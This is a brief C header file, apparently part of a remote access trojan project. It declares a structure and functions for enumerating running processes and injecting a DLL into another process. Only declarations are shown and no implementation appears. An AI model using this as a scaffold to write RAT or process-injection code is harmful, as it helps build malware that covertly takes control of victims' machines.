#pragma once

#ifndef RAT_MULTI_PROCESSESS_H
#define RAT_MULTI_PROCESS_H 

#include "RAT_NEC_HEADERS.h"

typedef struct
{
	const char*		__DLL_PATH;


	HANDLE			__hPrcsSnap; 
	HANDLE			__hPrcs;
	PROCESSENTRY32		__PE32;
	DWORD			__dwPrioCls; 

}__RAT_INJECT_INFORMATION;


const char* __cdecl RAT_GET_DLL_PATH(const char*);
HANDLE __cdecl INJECTDLL_RAT(const char*, HANDLE);
BOOL   __cdecl __GETPRCLIST();

#endif // !RAT_MULTI_PROCESSESS_H
